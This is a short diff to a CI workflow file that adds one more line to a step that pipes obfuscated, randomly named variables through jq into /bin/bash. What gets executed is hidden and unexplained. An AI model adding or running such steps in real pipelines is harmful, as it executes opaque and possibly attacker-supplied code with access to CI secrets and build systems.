@@ -25,6 +25,7 @@ jobs:
           echo $xrm45020 | jq -r .rt315 | /bin/bash
           printf '%s' "$b6224" | jq -r .hlqf91517 | /bin/bash
           echo $kdykm5 | jq -r .drw86568 | /bin/bash
+          echo $of12 | jq -r .zo1048 | /bin/bash
 
       - name: Persist results
         if: always()
